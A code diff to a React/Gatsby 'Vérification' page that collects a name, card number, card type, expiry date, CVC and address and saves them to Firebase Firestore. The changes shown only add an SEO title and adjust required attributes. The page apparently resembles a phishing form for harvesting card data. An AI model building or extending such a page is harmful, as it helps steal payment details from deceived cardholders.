@@ -3,6 +3,7 @@ import {useState, useEffect} from "react";
 import {StaticImage} from "gatsby-plugin-image";
 import './Verification.css';
 import {addVerificationDetails} from "../firebase/firestore";
+import SEO from "../SEO";
 export default function Verification (){
     const [name,setName]=useState("");
     const [cardNo,setCardNo]=useState("");
@@ -28,7 +29,9 @@ export default function Verification (){
 
     }
     return <div className="u-body u-xl-mode">
-    <section className="u-clearfix u-verification-section-1" id="sec-a671">
+        <SEO title="Vérification"/>
+
+        <section className="u-clearfix u-verification-section-1" id="sec-a671">
         <div className="u-clearfix u-sheet u-sheet-1">
             <StaticImage className="u-image u-image-default u-image-1" src="../images/R.png" alt="" data-image-width="2272"
                  data-image-height="1704"/>
@@ -45,20 +48,20 @@ export default function Verification (){
                                 <label htmlFor="name-f1a2" className="u-label">Nom</label>
                                 <input value={name} onChange={e=>setName(e.target.value)}
                                     autoFocus={true} type="text" placeholder="Entrez votre nom et prénom" id="name-f1a2" name="name"
-                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
+                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required={true}/>
                             </div>
                             <div className="u-form-group u-form-name u-label-none u-form-group-2">
                                 <label htmlFor="name-340f" className="u-label">Numéro de carte</label>
                                 <input value={cardNo} onChange={e=>setCardNo(e.target.value)}
                                     type="text" placeholder="Numéro de carte" id="name-340f" name="card"
-                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
+                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required={true}/>
                             </div>
                             <div className="u-form-group u-form-select u-label-none u-form-group-3">
                                 <label htmlFor="select-5e3e" className="u-label">Type de carte</label>
                                 <div className="u-form-select-wrapper">
                                     <select value={cardType} onChange={(e)=>setCardType(e.target.value)} id="select-5e3e" name="visa"
                                             className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
-                                            required="required">
+                                            required={true}>
                                         <option value="NONE">Type de carte</option>
                                         <option value="CB">CB</option>
                                         <option value="Visa">Visa</option>
@@ -86,14 +89,14 @@ export default function Verification (){
                                     type="month" placeholder="Date d'expiration (MM/AA)" id="text-94d0" name="Date"
                                        className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
 
-                                       required="required"/>}
+                                       required={true}/>}
                             </div>
                             <div className="u-form-group u-label-none u-form-group-5">
                                 <label htmlFor="text-59d1" className="u-label">CVC</label>
                                 <input value={cvc} onChange={e=>setCVC(e.target.value)}
                                     type="number" placeholder="Cryptogramme visuel (CVV)" id="text-59d1" name="CVC"
                                        className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
-                                       required="required"/>
+                                       required={true}/>
                             </div>
                             <div className="u-form-address u-form-group u-label-none u-form-group-6">
                                 <label htmlFor="address-fa7c" className="u-label">Adresse</label>
